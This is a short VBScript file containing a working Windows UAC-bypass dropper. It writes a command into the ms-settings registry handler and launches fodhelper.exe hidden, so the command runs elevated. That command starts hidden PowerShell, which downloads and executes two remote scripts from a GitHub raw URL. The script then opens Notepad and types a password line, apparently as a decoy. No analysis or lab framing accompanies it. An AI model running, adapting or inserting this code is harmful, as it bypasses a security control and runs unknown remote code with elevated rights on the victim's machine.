Const HKEY_CURRENT_USER = &H80000001

Const FodHelperPath = "C:\\Windows\\System32\\fodhelper.exe"
Const RegKeyPathStr = "SOFTWARE\\Classes\\ms-settings\\shell\\open\\command"
Const RegKeyPath = "Software\\Classes\\ms-settings\\shell\\open\\command"
Const DelegateExecRegKeyName = "DelegateExecute"
Const DelegateExecRegKeyValue = ""
Const DefaultRegKeyName = ""
Const DefaultRegKeyValue = "cmd /c powershell -w 1 -nop IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R1.ps1');IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/section10housing/b1/master/R2.ps1')"

Const RegObjectPath = "winmgmts:{impersonationLevel=impersonate}!\\.\root\default:StdRegProv"
Set Registry = GetObject(RegObjectPath)

Registry.CreateKey HKEY_CURRENT_USER, RegKeyPath
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DelegateExecRegKeyName, DelegateExecRegKeyValue
Registry.SetStringValue HKEY_CURRENT_USER, RegKeyPathStr, DefaultRegKeyName, DefaultRegKeyValue

Set Shell = WScript.CreateObject("WScript.Shell")
Shell.Run FodHelperPath, 0, True

Set Notepad = WScript.CreateObject("WScript.Shell")
Notepad.Run "c:\windows\system32\notepad.exe", 3, False

WScript.Sleep 1000

Notepad.SendKeys "Password: secure this"
